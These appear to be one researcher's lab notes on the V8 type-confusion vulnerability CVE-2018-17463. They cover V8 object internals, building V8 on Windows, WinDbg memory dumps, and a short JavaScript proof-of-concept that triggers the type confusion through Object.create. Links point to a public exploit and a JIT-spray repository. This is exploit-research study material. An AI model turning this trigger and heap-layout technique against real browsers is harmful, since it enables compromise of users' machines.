# CVE-2018-17463 V8 (no sandbox escape)

https://jhalon.github.io/chrome-browser-exploitation-1/

how does javascript work?

code -> token -> ast -> bytecode -> optimized code

js -> parser -> parser -> interpreter -> compiler

v8 handles parser

ignition handles bytecode (interpreter)

sparkplug handles non-optimized code

turbofan handles optimized code

https://www.youtube.com/watch?v=5nmpokoRaZI

https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775

https://v8.dev/blog/ignition-interpreter

tldr: important things to note (covers javascript + v8 portion)

1. javascript types are dynamic, but how does this shit work if javascript is based on c++ which is statically typed?

    - Map aka Hidden Class (Shape)

    - Pointer Compression

2. Object Representation

    - V8 creates JSobject and allocates memory

    - Got Map which is pointer to HIddenClass

        - HOW? prototype-based inheritance

        - got illustration, just look at it

    - Got properties which is pointer to object containing named properies

        - fast properties: go to descriptor array within hidden class

        - slow properties: stored in properties dictionary, use hash table to access properties
        
    - Elements which is like properties but for numbered properties

    - In-Object properties (defined at initialization)

3. Pointer Tagging

    - in v8, values represented as objects and allocated on the heap

    - if we need to keep allocating on heap everytime we manipulate/create/delete object, that sucks

    - instead, store some of the values inline so that we dont have to keep using the heap

    - then how to differentiate object pointer from inline value? pointer tagging

4. Pointer Compression

    - use 4 bytes instead of 8 bytes 

    - MSB stored in r13


debugging purposes: d8 --allow-natives-syntax --trace-opt

%DebugPrint(obj1)

https://jhalon.github.io/chrome-browser-exploitation-2/ (cover bytecode and optimization)

talks more about chromium and chrome

browser process: browser (run ui, and manage all other process)

renderer process: renderers (handle web content)

-> uses blink and skia

in chrome, each new window or tab open new rendere process, has RenderProcess which manage communication with parent browser process 

main browser process has RenderProcessHost for each renderer

To communicate between each of these processes, chromium will use OPC or Mojo

To make it more secure, we have sandbox: each renderer only access to netwrk resources via network service dispatcher

If you get RCE within renderer, cannot do shit

V8 isolate and context

- isolate: VM to execute javascript

- context: state of VM

Ignition: generation of bytecode

Sparkplug: execution of bytecode (convert bytecode into machine code)

Turbofan: optmization

    - Turbofan is a JIT compiler

https://jhalon.github.io/chrome-browser-exploitation-3/

git clone https://chromium.googlesource.com/v8/v8

vs2017_install: C:\Program Files (x86)\Microsoft Visual Studio 14.0\

GYP_MSVS_VERSION: 2017

C:\Program Files (x86)\Windows Kits\10\bin\10.0.17134.0\x64

C:\Users\babay\Downloads\ninja-win

C:\Users\babay\Downloads\depot_tools

https://jhalon.github.io/chrome-browser-exploitation-3/

https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159

https://medium.com/angular-in-depth/how-to-build-v8-on-windows-and-not-go-mad-6347c69aacd4

https://source.chromium.org/chromium/_/chromium/v8/v8.git/+/6391d7a58d0c58cd5d096d22453b954b3ecc6fec

https://source.chromium.org/chromium/_/chromium/v8/v8.git/+/62ed75a1d26932754ffcaef2db7c4ce2b0b5737e

use msvc 2017. no problemos

git checkout 568979f4d891bafec875fab20f608ff9392f4f29

https://chromium-review.googlesource.com/c/v8/v8/+/1382738

https://chromium-review.googlesource.com/c/chromium/src/+/1962898/1/build/toolchain/win/tool_wrapper.py#21

https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/

basically the vulnerability lies in the fact that the kNoWrite flag indicates that the CreateObject operation will not have observable side effects, or in other words, observable changes to the execution of the context.

Object.create(obj) causes map of object to change from FastProperties to DictionaryProperties

If we can remove CheckMap, then trigger type confusion

bp v8!v8::internal::Runtime_DebugPrint

--allow-natives-syntax C:\Users\kali\Desktop\CVE-2018-17463\exploit.js

DebugPrint: 000000A155A8DAA9: [JS_OBJECT_TYPE]
 - map: 0x02447288c251 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x01c865e84229 <Object map = 00000244728822F1>
 - elements: 0x00de84002cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x00a155a8db51 <PropertyArray[3]> {
    #a: 42 (data field 0)
    #b: 43 (data field 1) properties[0]
 }

0:000> dq 000000A155A8DAA9-1
000000a1`55a8daa8  00000244`7288c251 | 000000a1`55a8db51 | <- backing store
000000a1`55a8dab8  000000de`84002cf1 0000002a`00000000
000000a1`55a8dac8  000000de`84002341 00000005`00000000
000000a1`55a8dad8  00000001`00000000 000000de`840046f9
000000a1`55a8dae8  000001c8`65ea2049 00000140`00000000
000000a1`55a8daf8  00000001`00000000 000000de`84002341
000000a1`55a8db08  00000008`00000000 00000002`00000000
000000a1`55a8db18  000000de`840046f9 000001c8`65ea2049

0:000> dq 0x00a155a8db51-1
000000a1`55a8db50  000000de`84003899 00000003`00000000
000000a1`55a8db60  0000002b`00000000 000000de`840025a1
000000a1`55a8db70  000000de`840025a1 deadbeed`beadbeef
000000a1`55a8db80  deadbeed`beadbeef deadbeed`beadbeef
000000a1`55a8db90  deadbeed`beadbeef deadbeed`beadbeef
000000a1`55a8dba0  deadbeed`beadbeef deadbeed`beadbeef
000000a1`55a8dbb0  deadbeed`beadbeef deadbeed`beadbeef
000000a1`55a8dbc0  deadbeed`beadbeef deadbeed`beadbeef

Redundancy elimation removes redundant type checks

function vuln(obj) {
  // Access Property a of obj, forcing a CheckMap operation
  obj.a;

  // Force a Map Transition via our side-effect
  Object.create(obj)

  // Trigger our type-confusion by accessing an out-of-bound property
  return obj.b;
}

for (let i = 0; i < 10000; i++) {
  let obj = {a:42}; // Create object with in-line properties
  obj.b = 43; // Store property out-of-line in backing store
  if (i = 1) { %DebugPrint(obj); }
  vuln(obj); // Trigger type-confusion
  if (i = 9999) { %DebugPrint(obj); } // at this point, chekmap operation should be removed, hence when you call Object.create, 
  // the map will be interpreted as Dictionary Properties
}

DebugPrint: 000000A155A8DAA9: [JS_OBJECT_TYPE]
 - map: 0x02447288c2f1 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]
 - prototype: 0x01c865e84229 <Object map = 00000244728822F1>
 - elements: 0x00de84002cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x00a155a8db79 <NameDictionary[29]> {
   #b: 43 (data, dict_index: 2, attrs: [WEC])
   #a: 42 (data, dict_index: 1, attrs: [WEC])
 }

0:000> dq 0x02447288c2f1-1
00000244`7288c2f0  000000de`84002251 1b000421`16040304
00000244`7288c300  00000000`193003ff 000001c8`65e84229
00000244`7288c310  000001c8`65e84261 000001c8`65ea29f9
00000244`7288c320  000000de`84002321 00000000`00000000
00000244`7288c330  000000de`84002391 0000010c`3a102201
00000244`7288c340  000000de`84002251 19000421`16030307
00000244`7288c350  00000000`082003ff 000000a1`55a8daa9
00000244`7288c360  000001c8`65e84261 00000000`0000000

even though the map is dictionaryproperties, the program still thinks its an array and directly tries to access it

at dq 0x02447288c2f1-1+0x10 which in this case is 0x0, hence the value returned is 0x0

now that we have changed to dictionaryproperties, to find our 42 and 43, we need to dump whereever the address of the object +0x8 is pointing to

000000a1`55a8db51

Next step: find overlapping values within dictionaryproperties and fastproperties

this is another run:

0:000> dq 00000316`d5c0db79-1 La0
00000316`d5c0db78  00000116`ebc83669 0000001d`00000000
00000316`d5c0db88  00000002`00000000 00000000`00000000
00000316`d5c0db98  00000008`00000000 00000003`00000000
00000316`d5c0dba8  00000000`00000000 00000116`ebc825a1
00000316`d5c0dbb8  00000116`ebc825a1 00000116`ebc825a1
00000316`d5c0dbc8  000002fe`980a2049 0000002a`00000000
00000316`d5c0dbd8  000001c0`00000000 00000116`ebc825a1
00000316`d5c0dbe8  00000116`ebc825a1 00000116`ebc825a1
00000316`d5c0dbf8  00000116`ebc825a1 00000116`ebc825a1
00000316`d5c0dc08  00000116`ebc825a1 00000116`ebc825a1
00000316`d5c0dc18  00000116`ebc825a1 00000116`ebc825a1
00000316`d5c0dc28  00000116`ebc825a1 00000116`ebc825a1
00000316`d5c0dc38  00000116`ebc825a1 00000116`ebc825a1
00000316`d5c0dc48  00000116`ebc825a1 00000116`ebc825a1
00000316`d5c0dc58  000002fe`980a2061 0000002b`00000000
00000316`d5c0dc68  000002c0`00000000 00000323`06a8c341
00000316`d5c0dc78  00000116`ebc82cf1 00000116`ebc82cf1
00000316`d5c0dc88  00000116`ebc825a1 00000116`ebc825a1
00000316`d5c0dc98  00000116`ebc825a1 00000116`ebc825a1
00000316`d5c0dca8  deadbeed`beadbeef deadbeed`beadbeef
00000316`d5c0dcb8  deadbeed`beadbeef deadbeed`beadbeef




d8> vuln({a:42, b:43})
43
d8> vuln({a:42, b:43})
43
d8> %OptimizeFunctionOnNextCall(vuln)
undefined
d8> vuln({a:42, b:43})
0

this returns 0

--allow-natives-syntax C:\Users\kali\Desktop\CVE-2018-17463\exploit.js

function vuln(obj) {  obj.a;  Object.create(obj); return obj.b ; }
print(vuln({a:42, b:43}));
print(vuln({a:42, b:43}));
%OptimizeFunctionOnNextCall(vuln);
print(vuln({a:42, b:43}));

0:000> dqs 000000198140DB71-1 l10
00000019`8140db70  000002c7`e570c2f1
00000019`8140db78  00000019`8140dc89
00000019`8140db80  00000150`7df02cf1
00000019`8140db88  00004242`00000000
00000019`8140db90  00004343`00000000
00000019`8140db98  00000150`7df02341
00000019`8140dba0  00000005`00000000
00000019`8140dba8  00000001`00000000
00000019`8140dbb0  00000150`7df046f9
00000019`8140dbb8  0000020f`d2222049
00000019`8140dbc0  00000140`00000000
00000019`8140dbc8  00000001`00000000
00000019`8140dbd0  00000150`7df02341
00000019`8140dbd8  00000008`00000000
00000019`8140dbe0  00000002`00000000
00000019`8140dbe8  00000150`7df046f9

0:000> dqs 00000019`8140dc89-1 l10
00000019`8140dc88  00000150`7df03899
00000019`8140dc90  00000003`00000000
00000019`8140dc98  00004545`00000000
00000019`8140dca0  00004646`00000000 obj.d <- will return whatever that is here
00000019`8140dca8  00000150`7df025a1
00000019`8140dcb0  00000150`7df02341
00000019`8140dcb8  0000000e`00000000
00000019`8140dcc0  00000004`00000000
00000019`8140dcc8  00000150`7df046f9
00000019`8140dcd0  0000020f`d2222049
00000019`8140dcd8  00000540`00000000
00000019`8140dce0  00000001`00000000
00000019`8140dce8  0000020f`d2222079
00000019`8140dcf0  00100940`00000000
00000019`8140dcf8  00000001`00000000
00000019`8140dd00  000003e4`6b3068c9



bp v8!v8::internal::Runtime_DebugPrint






0:000> dqs 0000022F990532C1-1 l10
0000022f`990532c0  00000278`6720cac1
0000022f`990532c8  0000022f`990536c9
0000022f`990532d0  000000f1`4fd82cf1
0000022f`990532d8  00004242`00000000
0000022f`990532e0  00004343`00000000
0000022f`990532e8  000000f1`4fd83899
0000022f`990532f0  00000003`00000000
0000022f`990532f8  00004545`00000000
0000022f`99053300  00004646`00000000
0000022f`99053308  00004747`00000000
0000022f`99053310  000000f1`4fd83899
0000022f`99053318  00000006`00000000
0000022f`99053320  00004545`00000000
0000022f`99053328  00004646`00000000
0000022f`99053330  00004747`00000000
0000022f`99053338  00004848`00000000
0:000> dqs 0000022f`990536c9-1 l10 <- fixed array
0000022f`990536c8  000000f1`4fd83899
0000022f`990536d0  0000001b`00000000 <- number of added values 
0000022f`990536d8  00004545`00000000
0000022f`990536e0  00004646`00000000
0000022f`990536e8  00004747`00000000
0000022f`990536f0  00004848`00000000
0000022f`990536f8  00004949`00000000
0000022f`99053700  00004a4a`00000000
0000022f`99053708  00004545`00000000
0000022f`99053710  00004646`00000000
0000022f`99053718  00004545`00000000
0000022f`99053720  00004646`00000000
0000022f`99053728  00004545`00000000
0000022f`99053730  00004646`00000000
0000022f`99053738  00004545`00000000
0000022f`99053740  00004646`00000000
0:000> ?1b
Evaluate expression: 27 = 00000000`0000001b

https://www.exploit-db.com/exploits/48184

d8> %DebugPrint(buffer)
(d8):1: SyntaxError: Unexpected token %
%DebugPrint(buffer)
^
SyntaxError: Unexpected token %

d8> %DebugPrint(buffer)
^C
C:\v8\v8\out\x64.debug>d8 --allow-natives-syntax
V8 version 7.1.0 (candidate)
d8> var buffer = new ArrayBuffer(8)
undefined
d8> var view = new Uint8Array(buffer)
undefined
d8> %DebugPrint(buffer)
DebugPrint: 000001D83A70D881: [JSArrayBuffer]
 - map: 0x03c56e384371 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x02f540c90b21 <Object map = 000003C56E3843C1>
 - elements: 0x0255aec02cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0000020FEC5168E0
 - byte_length: 8
 - neuterable
 - properties: 0x0255aec02cf1 <FixedArray[0]> {}
 - embedder fields = {
    0000000000000000
    0000000000000000
 }
000003C56E384371: [Map]
 - type: JS_ARRAY_BUFFER_TYPE
 - instance size: 64
 - inobject properties: 0
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x0255aec025a1 <undefined>
 - prototype_validity cell: 0x00f15f682201 <Cell value= 1>
 - instance descriptors (own) #0: 0x0255aec02321 <DescriptorArray[2]>
 - layout descriptor: 0000000000000000
 - prototype: 0x02f540c90b21 <Object map = 000003C56E3843C1>
 - constructor: 0x02f540c90981 <JSFunction ArrayBuffer (sfi = 000000F15F696201)>
 - dependent code: 0x0255aec02391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[object ArrayBuffer]
d8> view[0] = 0x66
102
d8> view[1] = 0x65
101
d8> %DebugPrint(buffer)
DebugPrint: 000001D83A70D881: [JSArrayBuffer]
 - map: 0x03c56e384371 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x02f540c90b21 <Object map = 000003C56E3843C1>
 - elements: 0x0255aec02cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0000020FEC5168E0
 - byte_length: 8
 - neuterable
 - properties: 0x0255aec02cf1 <FixedArray[0]> {}
 - embedder fields = {
    0000000000000000
    0000000000000000
 }
000003C56E384371: [Map]
 - type: JS_ARRAY_BUFFER_TYPE
 - instance size: 64
 - inobject properties: 0
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x0255aec025a1 <undefined>
 - prototype_validity cell: 0x00f15f682201 <Cell value= 1>
 - instance descriptors (own) #0: 0x0255aec02321 <DescriptorArray[2]>
 - layout descriptor: 0000000000000000
 - prototype: 0x02f540c90b21 <Object map = 000003C56E3843C1>
 - constructor: 0x02f540c90981 <JSFunction ArrayBuffer (sfi = 000000F15F696201)>
 - dependent code: 0x0255aec02391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[object ArrayBuffer]
d8> %DebugPrint(buffer)
DebugPrint: 000001D83A70D881: [JSArrayBuffer]
 - map: 0x03c56e384371 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x02f540c90b21 <Object map = 000003C56E3843C1>
 - elements: 0x0255aec02cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0000020FEC5168E0
 - byte_length: 8
 - neuterable
 - properties: 0x0255aec02cf1 <FixedArray[0]> {}
 - embedder fields = {
    0000000000000000
    0000000000000000
 }
000003C56E384371: [Map]
 - type: JS_ARRAY_BUFFER_TYPE
 - instance size: 64
 - inobject properties: 0
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x0255aec025a1 <undefined>
 - prototype_validity cell: 0x00f15f682201 <Cell value= 1>
 - instance descriptors (own) #0: 0x0255aec02321 <DescriptorArray[2]>
 - layout descriptor: 0000000000000000
 - prototype: 0x02f540c90b21 <Object map = 000003C56E3843C1>
 - constructor: 0x02f540c90981 <JSFunction ArrayBuffer (sfi = 000000F15F696201)>
 - dependent code: 0x0255aec02391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[object ArrayBuffer]
d8> %DebugPrint(view)
DebugPrint: 000001D83A70F791: [JSTypedArray]
 - map: 0x03c56e382b11 <Map(UINT8_ELEMENTS)> [FastProperties]
 - prototype: 0x02f540c879e1 <Object map = 000003C56E382B61>
 - elements: 0x01d83a70f7d9 <FixedUint8Array[8]> [UINT8_ELEMENTS]
 - embedder fields: 2
 - buffer: 0x01d83a70d881 <ArrayBuffer map = 000003C56E384371>
 - byte_offset: 0
 - byte_length: 8
 - length: 8
 - properties: 0x0255aec02cf1 <FixedArray[0]> {}
 - elements: 0x01d83a70f7d9 <FixedUint8Array[8]> {
           0: 102
           1: 101
         2-7: 0
 }
 - embedder fields = {
    0000000000000000
    0000000000000000
 }
000003C56E382B11: [Map]
 - type: JS_TYPED_ARRAY_TYPE
 - instance size: 72
 - inobject properties: 0
 - elements kind: UINT8_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x0255aec025a1 <undefined>
 - prototype_validity cell: 0x00f15f682201 <Cell value= 1>
 - instance descriptors (own) #0: 0x0255aec02321 <DescriptorArray[2]>
 - layout descriptor: 0000000000000000
 - prototype: 0x02f540c879e1 <Object map = 000003C56E382B61>
 - constructor: 0x02f540c878e1 <JSFunction Uint8Array (sfi = 000000F15F697099)>
 - dependent code: 0x0255aec02391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

102,101,0,0,0,0,0,0
d8>




0:001> dqs 000001D83A70D881
000001d8`3a70d881  f1000003`c56e3843
000001d8`3a70d889  f1000002`55aec02c
000001d8`3a70d891  08000002`55aec02c
000001d8`3a70d899  e0000000`00000000
000001d8`3a70d8a1  02000002`0fec5168
000001d8`3a70d8a9  00000000`00000000
000001d8`3a70d8b1  00000000`00000000
000001d8`3a70d8b9  c1000000`00000000
000001d8`3a70d8c1  e6000002`55aec029
000001d8`3a70d8c9  0a000006`b5785f3b
000001d8`3a70d8d1  6f697463`6e756628
000001d8`3a70d8d9  7375220a`7b29286e
000001d8`3a70d8e1  74636972`74732065
000001d8`3a70d8e9  61207261`760a3b22
000001d8`3a70d8f1  636e7566`0a3b343d
000001d8`3a70d8f9  50736920`6e6f6974
0:001> dc 000001D83A70D881
000001d8`3a70d881  c56e3843 f1000003 55aec02c f1000002  C8n.....,..U....
000001d8`3a70d891  55aec02c 08000002 00000000 e0000000  ,..U............
000001d8`3a70d8a1  0fec5168 02000002 00000000 00000000  hQ..............
000001d8`3a70d8b1  00000000 00000000 00000000 c1000000  ................
000001d8`3a70d8c1  55aec029 e6000002 b5785f3b 0a000006  )..U....;_x.....
000001d8`3a70d8d1  6e756628 6f697463 7b29286e 7375220a  (function(){."us
000001d8`3a70d8e1  74732065 74636972 760a3b22 61207261  e strict";.var a
000001d8`3a70d8f1  0a3b343d 636e7566 6e6f6974 50736920  =4;.function isP
0:001> dqs 000001D83A70D881
000001d8`3a70d881  f1000003`c56e3843
000001d8`3a70d889  f1000002`55aec02c
000001d8`3a70d891  08000002`55aec02c
000001d8`3a70d899  e0000000`00000000
000001d8`3a70d8a1  02000002`0fec5168
000001d8`3a70d8a9  00000000`00000000
000001d8`3a70d8b1  00000000`00000000
000001d8`3a70d8b9  c1000000`00000000
000001d8`3a70d8c1  e6000002`55aec029
000001d8`3a70d8c9  0a000006`b5785f3b
000001d8`3a70d8d1  6f697463`6e756628
000001d8`3a70d8d9  7375220a`7b29286e
000001d8`3a70d8e1  74636972`74732065
000001d8`3a70d8e9  61207261`760a3b22
000001d8`3a70d8f1  636e7566`0a3b343d
000001d8`3a70d8f9  50736920`6e6f6974
0:001> dqs 000001D83A70D881-1
000001d8`3a70d880  000003c5`6e384371
000001d8`3a70d888  00000255`aec02cf1
000001d8`3a70d890  00000255`aec02cf1
000001d8`3a70d898  00000000`00000008
000001d8`3a70d8a0  0000020f`ec5168e0
000001d8`3a70d8a8  00000000`00000002
000001d8`3a70d8b0  00000000`00000000
000001d8`3a70d8b8  00000000`00000000
000001d8`3a70d8c0  00000255`aec029c1
000001d8`3a70d8c8  000006b5`785f3be6
000001d8`3a70d8d0  6974636e`7566280a
000001d8`3a70d8d8  75220a7b`29286e6f
000001d8`3a70d8e0  63697274`73206573
000001d8`3a70d8e8  20726176`0a3b2274
000001d8`3a70d8f0  6e75660a`3b343d61
000001d8`3a70d8f8  7369206e`6f697463
0:001> dqs 0000020FEC5168E0
0000020f`ec5168e0  00000000`00006566
0000020f`ec5168e8  dddddddd`fdfdfdfd
0000020f`ec5168f0  00000000`dddddddd
0000020f`ec5168f8  8c002700`957c88cc
0000020f`ec516900  0000020f`ec516310
0000020f`ec516908  0000020f`ec515f00
0000020f`ec516910  00000000`00000000
0000020f`ec516918  00000001`00000000
0000020f`ec516920  00000000`00000010
0000020f`ec516928  fdfdfdfd`0000206f
0000020f`ec516930  00007fff`6d8f18fc*** WARNING: Unable to verify checksum for C:\v8\v8\out\x64.debug\v8.dll
 v8!`string'
0000020f`ec516938  cdcdcdcd`0000000c
0000020f`ec516940  00000000`fdfdfdfd
0000020f`ec516948  8c002800`957788d7
0000020f`ec516950  0000020f`ec515e60
0000020f`ec516958  0000020f`ec53ab10


var buffer = new ArrayBuffer(8)
var view = new Uint8Array(buffer) <- basically this view affects the backing store (typed arrays)
%DebugPrint(buffer) : 000001D83A70D881 ; backing store 0000020FEC5168E0
000001d8`3a70d880  000003c5`6e384371
000001d8`3a70d888  00000255`aec02cf1 +8
000001d8`3a70d890  00000255`aec02cf1 +10
000001d8`3a70d898  00000000`00000008 +18
000001d8`3a70d8a0  0000020f`ec5168e0 +20
0:001> dqs 0000020FEC5168E0
0000020f`ec5168e0  00000000`00006566




arr = [0x41, 1.1, 0x42]

https://resource.heltec.cn/utils/hf

0:012> dqs 0x02dc2638f819-1
000002dc`2638f818  000002fc`3fa034d9
000002dc`2638f820  00000003`00000000
000002dc`2638f828  40508000`00000000 <- 0x41 in doubles
000002dc`2638f830  3ff19999`9999999a
000002dc`2638f838  40504000`00000000
000002dc`2638f840  000002fc`3fa029c1
000002dc`2638f848  00000010`b8f322d2
000002dc`2638f850  72506775`62654425
000002dc`2638f858  29727261`28746e69
000002dc`2638f860  000002fc`3fa023a1
000002dc`2638f868  00000001`00000000
000002dc`2638f870  0000019c`4bc2588b
000002dc`2638f878  000002fc`3fa028d1
000002dc`2638f880  00000004`00000000
000002dc`2638f888  00000167`40a84de9
000002dc`2638f890  000002dc`2638f841

d8> a=[5, "test", 1.1]
[5, "test", 1.1]
d8> %DebugPrint(a)
DebugPrint: 000002DC263900B1: [JSArray]
 - map: 0x02d4f8404fa1 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x019c4bc136b1 <JSArray[0]>
 - elements: 0x02dc26390059 <FixedArray[3]> [PACKED_ELEMENTS (COW)]
 - length: 3
 - properties: 0x02fc3fa02cf1 <FixedArray[0]> {
    #length: 0x016740a99469 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x02dc26390059 <FixedArray[3]> {
           0: 5
           1: 0x016740a93599 <String[4]: test>
           2: 0x019c4bc26539 <HeapNumber 1.1>
 }

force array in v8 to store the double as a heap number to see its representation in memory

0:012> dqs 0x019c4bc26539-1
0000019c`4bc26538  000002fc`3fa02631
0000019c`4bc26540  3ff19999`9999999a <-


d8> var obj = { a:1, b:2, c:3 }
undefined
d8> %DebugPrint(obj)
DebugPrint: 000002DC263912D9: [JS_OBJECT_TYPE]
 - map: 0x02d4f840c391 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x019c4bc04229 <Object map = 000002D4F84022F1>
 - elements: 0x02fc3fa02cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x02fc3fa02cf1 <FixedArray[0]> {
    #a: 1 (data field 0)
    #b: 2 (data field 1)
    #c: 3 (data field 2)
 }

0:001> dqs 000002DC263912D9-1
000002dc`263912d8  000002d4`f840c391
000002dc`263912e0  000002fc`3fa02cf1
000002dc`263912e8  000002fc`3fa02cf1
000002dc`263912f0  00000001`00000000
000002dc`263912f8  00000002`00000000
000002dc`26391300  00000003`00000000





















%DebugPrint(view): 000001D83A70F791

https://www.usenix.org/system/files/conference/woot18/woot18-paper-gawlik.pdf

JIT Spray

https://chromium.googlesource.com/chromium/src/+/HEAD/docs/design/sandbox.md

https://www.chromium.org/developers/design-documents/multi-process-architecture/

https://github.com/kdmarti2/CVE-2018-17463 (JIT SPRAY TODO)